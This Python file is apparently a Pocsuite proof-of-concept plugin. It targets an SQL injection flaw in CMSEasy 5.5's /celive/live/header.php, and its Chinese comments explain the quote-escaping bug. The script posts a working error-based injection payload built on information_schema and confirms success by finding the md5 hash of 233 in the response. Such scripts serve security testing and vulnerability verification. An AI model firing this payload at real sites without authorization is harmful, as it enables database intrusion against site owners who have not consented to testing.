#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class CmsEasyPoC(POCBase):
    vulID = '88979'
    version = '1'
    author = 'Medici.Yan'
    vulDate = '2014-10-22'
    createDate = '2015-12-28'
    updateDate = '2015-12-28'
    references = ['http://wooyun.org/bugs/wooyun-2010-070827']
    name = 'CMSEasy 5.5 /celive/live/header.php SQL注入漏洞 POC'
    appPowerLink = 'http://www.cmseasy.cn/'
    appName = 'CMSEasy'
    appVersion = '5.5'
    vulType = 'SQL Injection'
    desc = '''
           开发人员在修补漏洞的时候只修复了少数的变量而遗漏了其他变量，使其他变量直接
           带入了SQL语句中，可以通过\字符来转义掉一个单引号，逃逸单引号，产生SQL注入。
           此注入为报错注入，可以通过UpdateXML函数进行注入。
    '''
    samples = ['']

    def _verify(self):
        result = {}
        target = self.url + '/celive/live/header.php'
        post_data = {
            'xajax': 'LiveMessage',
            'xajaxargs[0][name]': "1',(SELECT 1 FROM (select count(*),concat("
                                  "floor(rand(0)*2),(select md5(233)))a from "
                                  "information_schema.tables group by a)b),"
                                  "'','','','1','127.0.0.1','2') #"
        }
        # 使用 requests 发送 post 请求
        response = req.post(target, data=post_data, timeout=10)
        content = response.content
        # 这个 e165421110ba03099a1c0393373c5b43 就是 md5(233) 的值
        if 'e165421110ba03099a1c0393373c5b43' in content:
            result = {'VerifyInfo': {}}
            result['VerifyInfo']['URL'] = target

        return self.parse_result(result)

    def _attack(self):
        return self._verify()

    def parse_result(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('Internet Nothing returned')

        return output


register(CmsEasyPoC)